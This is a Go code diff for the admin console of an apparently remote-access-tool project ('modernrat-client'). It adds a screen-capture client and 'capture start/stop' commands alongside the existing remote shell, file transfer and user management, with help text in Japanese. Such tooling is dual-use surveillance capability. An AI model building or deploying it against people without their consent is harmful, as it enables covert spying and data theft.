@@ -7,6 +7,7 @@ import (
 	"io"
 	"path/filepath"
 	"strings"
+	"sync"
 	"time"
 
 	pb "modernrat-client/gen"
@@ -15,15 +16,19 @@ import (
 )
 
 type adminApp struct {
-	ctx          context.Context
-	adminClient  pb.AdminServiceClient
-	shellClient  pb.RemoteShellServiceClient
-	fileClient   pb.FileTransferServiceClient
-	token        string
-	defaultUser  string
-	attachedUser string
-	listFilter   string
-	listPageSize int
+	ctx           context.Context
+	adminClient   pb.AdminServiceClient
+	shellClient   pb.RemoteShellServiceClient
+	fileClient    pb.FileTransferServiceClient
+	captureClient pb.ScreenCaptureServiceClient
+	token         string
+	defaultUser   string
+	attachedUser  string
+	listFilter    string
+	listPageSize  int
+
+	captureMu sync.Mutex
+	capture   *captureController
 }
 
 var errCommandExit = errors.New("exit command requested")
@@ -212,6 +217,9 @@ func (a *adminApp) executeCommand(cmd string, args []string) error {
 		a.defaultUser = userID
 		return nil
 
+	case "capture":
+		return a.handleCaptureCommand(args)
+
 	case "list", "users":
 		if len(args) > 0 {
 			a.listFilter = strings.Join(args, " ")
@@ -297,6 +305,8 @@ func printHelp() {
 	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "upload <local> [remote] [--user <id>]"), "ファイルをアップロード")
 	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "download <remote> [local] [--user <id>]"), "ファイルをダウンロード")
 	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "delete <user_id>"), "ユーザーを削除")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "capture start [options]"), "画面キャプチャを開始 (--open/--save)")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "capture stop"), "進行中の画面キャプチャを停止")
 	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "clear"), "画面をクリア")
 	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "exit"), "終了")
 }
